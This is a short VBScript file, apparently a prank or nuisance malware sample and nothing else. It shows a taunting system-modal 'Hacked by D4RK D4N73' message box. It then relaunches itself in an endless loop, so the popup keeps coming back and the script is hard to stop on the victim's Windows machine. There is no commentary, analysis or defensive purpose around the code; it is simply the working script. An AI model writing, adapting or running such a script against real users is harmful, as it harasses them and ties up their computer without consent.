MsgBox "Hacked by D4RK D4N73",4096+16,"Your security sucks. I am D4RK D4NM73,catch me.."
If Not WScript.Arguments.Named.Exists("task") Then
    Do
        CreateObject("WScript.Shell").Run """" & WScript.FullName & """ """ & WScript.ScriptFullName & """ ""/task""", 1, True
    Loop
End If

